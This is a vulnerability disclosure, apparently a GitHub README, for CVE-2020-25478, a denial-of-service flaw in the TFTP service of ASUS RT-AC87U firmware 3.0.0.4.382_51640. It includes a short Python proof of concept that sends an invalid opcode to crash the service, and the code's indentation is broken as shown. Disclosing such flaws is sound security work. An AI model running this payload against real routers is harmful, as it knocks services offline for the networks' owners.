# ASUS-RT-AC87U-TFTP-is-vulnerable-to-Denial-of-Service-DoS-attack
CVE-2020-25478 - ASUS RT-AC87U TFTP is vulnerable to Denial of Service(DoS) attack

1. NAME OF AFFECTED PRODUCT(S) AND VERSION(S)

ASUS RT-AC87U
3.0.0.4.382_51640


2. PROBLEM TYPE

Its primarily related to CWE-20, TFTP service running in ASUS RT-AC87U is vulnerable to Denial of Service(DoS) attack when invalid opcode is sent to the service. Following python code snippet is used for testing the vulnerability:

		import socket
		import sys
		tftpd = ('192.168.1.1', 69)
		#Try and open an UDP SOCKET
		try:
		tftp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		except:
		print("Failed on socket creation, so exiting")
		sys.exit(1)
		#create a invalid opcode exeeding the 2 byte length
		# opcode operation
		# 1 Read request (RRQ)
		# 2 Write request (WRQ)
		# 3 Data (DATA)
		# 4 Acknowledgment (ACK)
		# 5 Error (ERROR)
		invalidOpcode = "0000"
		tftp.sendto(invalidOpcode,tftpd)

3. DESCRIPTION

Asus RT-AC87U version 3.0.0.4.382_51640 is vulnerable to denial of service attack on TFTP service causing TFTP service to crash. TFTP service is prone to crash remotely by sending an invalid opcode.

https://www.asus.com/content/ASUS-Product-Security-Advisory/
